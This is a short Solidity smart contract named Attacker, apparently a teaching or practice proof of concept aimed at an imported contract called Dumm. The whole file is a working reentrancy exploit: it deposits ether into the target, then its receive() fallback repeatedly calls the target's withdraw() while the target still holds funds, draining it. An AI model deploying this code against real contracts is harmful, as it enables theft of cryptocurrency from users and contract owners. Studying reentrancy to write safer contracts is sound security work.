// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import "./Dumm.sol";

contract Attacker {  
    Dumm public dumm;
    address public owner;
    receive() payable external {
        if(address(msg.sender).balance>0) {
            dumm.withdraw();
        }
    }

    constructor(address _dumm) {
        dumm = Dumm(_dumm);
    }

    function sendEther() external payable {
        dumm.deposit{value:msg.value}();
    }

    function withdrawEther() external {
        dumm.withdraw();
    }

    function checkBalance() external view returns(uint) {
        return address(this).balance;
    }

}